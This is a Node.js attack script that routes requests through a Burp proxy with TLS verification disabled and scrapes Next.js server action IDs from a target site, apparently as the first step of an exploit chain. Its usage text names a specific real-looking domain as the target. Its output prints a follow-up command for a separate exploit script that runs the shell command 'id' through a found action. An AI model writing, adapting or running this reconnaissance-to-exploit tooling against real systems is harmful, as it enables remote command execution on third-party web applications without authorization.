#!/usr/bin/env node
// enumerate-burp.js - Fixed HTTPS through Burp

const net = require('net');
const tls = require('tls');
const { URL } = require('url');

class BurpEnumerator {
    constructor() {
        this.proxyHost = '127.0.0.1';
        this.proxyPort = 8082;
    }

    httpsRequestViaProxy(targetUrl) {
        return new Promise((resolve, reject) => {
            const url = new URL(targetUrl);
            const hostname = url.hostname;
            const path = url.pathname + url.search;
            const port = 443;

            console.log(`[*] Target: ${hostname} (HTTPS)`);
            console.log(`[*] Proxy: ${this.proxyHost}:${this.proxyPort}`);

            // Step 1: Connect to Burp
            const proxySocket = net.createConnection({
                host: this.proxyHost,
                port: this.proxyPort
            }, () => {
                console.log('[*] Connected to Burp');

                // Step 2: Send CONNECT request for HTTPS tunneling
                const connectRequest = `CONNECT ${hostname}:${port} HTTP/1.1\r\n` +
                    `Host: ${hostname}:${port}\r\n` +
                    `Proxy-Connection: Keep-Alive\r\n\r\n`;

                console.log('[*] Sending CONNECT request for HTTPS tunnel...');
                proxySocket.write(connectRequest);

                let buffer = '';
                proxySocket.on('data', (data) => {
                    buffer += data.toString();

                    // Check for CONNECT response
                    if (buffer.includes('\r\n\r\n')) {
                        const lines = buffer.split('\r\n');
                        const statusLine = lines[0];

                        if (statusLine.includes('200')) {
                            console.log('[*] CONNECT successful, establishing TLS...');

                            // Step 3: Create TLS connection through the tunnel
                            const tlsSocket = tls.connect({
                                socket: proxySocket,
                                host: hostname,
                                servername: hostname,
                                rejectUnauthorized: false
                            }, () => {
                                console.log('[*] TLS handshake complete');

                                // Step 4: Send HTTP request over TLS
                                const httpRequest = `GET ${path} HTTP/1.1\r\n` +
                                    `Host: ${hostname}\r\n` +
                                    `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n` +
                                    `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n` +
                                    `Accept-Language: en-US,en;q=0.9\r\n` +
                                    `Accept-Encoding: gzip, deflate, br\r\n` +
                                    `Connection: close\r\n\r\n`;

                                console.log('[*] Sending HTTPS request...');
                                tlsSocket.write(httpRequest);

                                let response = '';
                                tlsSocket.on('data', (chunk) => {
                                    response += chunk.toString();
                                });

                                tlsSocket.on('end', () => {
                                    console.log('[*] Response complete');
                                    // Extract body from response
                                    const parts = response.split('\r\n\r\n');
                                    if (parts.length > 1) {
                                        resolve(parts.slice(1).join('\r\n\r\n'));
                                    } else {
                                        resolve(response);
                                    }
                                });

                                tlsSocket.on('error', reject);
                            });

                            tlsSocket.on('error', reject);
                        } else {
                            console.error('[-] CONNECT failed:', statusLine);
                            proxySocket.end();
                            reject(new Error(`CONNECT failed: ${statusLine}`));
                        }
                    }
                });
            });

            proxySocket.on('error', reject);
            proxySocket.setTimeout(15000, () => {
                proxySocket.destroy();
                reject(new Error('Proxy connection timeout'));
            });
        });
    }

    extractActionIds(html) {
        console.log('\n[*] Extracting action IDs from HTML...');

        const ids = new Set();
        const patterns = [
            // Pattern 1: $ACTION_ID_{hex}
            { regex: /\$ACTION_ID_([a-f0-9]+)/g, name: 'ACTION_ID' },
            // Pattern 2: JSON action metadata
            { regex: /\{"id":"([a-f0-9]+)","bound"/g, name: 'JSON action' },
            // Pattern 3: action hashes in script tags
            { regex: /"action":"([a-f0-9]+)"/g, name: 'action attribute' },
            // Pattern 4: 40-char hex strings
            { regex: /"([a-f0-9]{40})"/g, name: '40-char hex' },
            // Pattern 5: 64-char hex strings
            { regex: /"([a-f0-9]{64})"/g, name: '64-char hex' },
            // Pattern 6: Next.js specific patterns
            { regex: /"__action_id":"([^"]+)"/g, name: '__action_id' },
            { regex: /"__server_action":"([^"]+)"/g, name: '__server_action' }
        ];

        patterns.forEach(pattern => {
            let match;
            while ((match = pattern.regex.exec(html)) !== null) {
                ids.add(match[1]);
                console.log(`    [+] ${pattern.name}: ${match[1]}`);
            }
        });

        return Array.from(ids);
    }

    async run() {
        const args = process.argv.slice(2);
        if (args.length < 1) {
            console.log('Usage: node enumerate-burp.js <url>');
            console.log('Example: node enumerate-burp.js https://panel.adymob.com');
            console.log('');
            console.log('Optional: Set proxy with env vars:');
            console.log('  PROXY_HOST=192.168.1.100 PROXY_PORT=8080 node enumerate-burp.js <url>');
            process.exit(1);
        }

        // Allow custom proxy
        if (process.env.PROXY_HOST) this.proxyHost = process.env.PROXY_HOST;
        if (process.env.PROXY_PORT) this.proxyPort = parseInt(process.env.PROXY_PORT);

        const url = args[0];
        console.log('[*] Target URL:', url);

        try {
            const html = await this.httpsRequestViaProxy(url);
            console.log(`[+] Received ${html.length} bytes`);

            // Debug: Save HTML to file for inspection
            const fs = require('fs');
            fs.writeFileSync('debug_response.html', html);
            console.log('[*] Saved response to debug_response.html');

            const actionIds = this.extractActionIds(html);

            if (actionIds.length > 0) {
                console.log(`\n[+] Found ${actionIds.length} unique action IDs:`);
                actionIds.forEach(id => console.log(`    ${id}`));

                console.log('\n[*] Use with exploit:');
                console.log(`    node exploit-urlencoded.js "${url}" "${actionIds[0]}" "id"`);
            } else {
                console.log('\n[-] No action IDs found in HTML');
                console.log('[*] Possible reasons:');
                console.log('    1. Site uses client-side rendering (SPA)');
                console.log('    2. Actions are loaded dynamically via JavaScript');
                console.log('    3. Need to trigger forms/buttons first');
                console.log('\n[*] Try these approaches:');
                console.log('    A. Check the saved debug_response.html file');
                console.log('    B. Try specific pages: /login, /register, /contact');
                console.log('    C. Use browser DevTools to find action IDs');
            }

        } catch (error) {
            console.error('[-] Error:', error.message);
            if (error.code) {
                console.error('[*] Error code:', error.code);
            }
        }
    }
}

// Run it
new BurpEnumerator().run();